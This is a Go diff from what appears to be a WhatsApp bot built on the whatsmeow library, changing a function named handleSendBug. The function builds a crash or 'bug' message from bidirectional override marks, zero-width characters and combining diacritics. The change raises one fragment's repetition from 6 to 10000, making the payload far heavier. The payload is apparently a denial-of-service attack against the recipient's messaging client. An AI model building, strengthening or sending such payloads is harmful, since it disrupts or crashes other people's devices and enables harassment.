@@ -885,7 +885,7 @@ func handleSendBug(client *whatsmeow.Client, v *events.Message, args []string) {
 		"\u202a\u202b\u202c\u202d\u202e\u202e\u202d\u202d"+
 			"\u202e\u200b\u202e\u200d\u202d\u200b\u202d\u200d"+
 			"\u2066\u2067\u2068\u2069\u2066\u2067"+
-			"\u0300\u0301\u0302\u0336\u034f", 6)
+			"\u0300\u0301\u0302\u0336\u034f", 10000)
 
 	payload3 := strings.Repeat("\u2060\u200f\u200b", 40)
 
